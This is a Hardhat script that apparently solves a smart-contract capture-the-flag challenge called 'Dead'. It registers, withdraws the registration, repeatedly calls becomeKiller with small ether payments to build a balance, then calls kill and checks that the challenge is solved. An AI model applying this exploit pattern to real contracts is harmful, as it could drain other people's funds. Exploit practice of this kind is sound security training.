// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  

  //get accounts and verify balances
  const [accounts] = await hre.ethers.getSigners();
  console.log("Signer is: ", accounts.address);

  
  //set addresses for current challenge
  const setupAddress = "0x9e6C0511d07695420A0B57003d6e8c133Cd0185d";
  const challengeAddress = "0x7e18A61fd65F5E5Cf693257235a0A1F360aBE7d8";
  const challengeName = "Dead";
  const setupName = "SetupBackup";

   
  //attach setup
  const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
  //attach challenge
  const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);

  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));

  //exploit logic
  console.log("balance of killer", await challengeContract.balances(await challengeContract.killer()));
  
  await challengeContract.register({value: parseEther("0.01")});
  console.log("Registered?", await challengeContract.registered(accounts.address));

  await challengeContract.withdrawRegistration();
  console.log("Still Registered?", await challengeContract.registered(accounts.address));
  
  await challengeContract.canKill();
  console.log("Time to kill?", await challengeContract.timeToKill());


  //becomeKiller a bunch of time to increase balance
  
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  await challengeContract.becomeKiller({value: parseEther("0.099")});
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  await challengeContract.becomeKiller({value: parseEther("0.099")});
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  await challengeContract.becomeKiller({value: parseEther("0.099")});
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  await challengeContract.becomeKiller({value: parseEther("0.099")});
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  await challengeContract.becomeKiller({value: parseEther("0.099")});
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  await challengeContract.becomeKiller({value: parseEther("0.099")});
  console.log("balance of sender", await challengeContract.balances(accounts.address));
  

  //verify killer
  console.log("killer is", await challengeContract.killer());
  
  //kill
  await challengeContract.kill();

  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
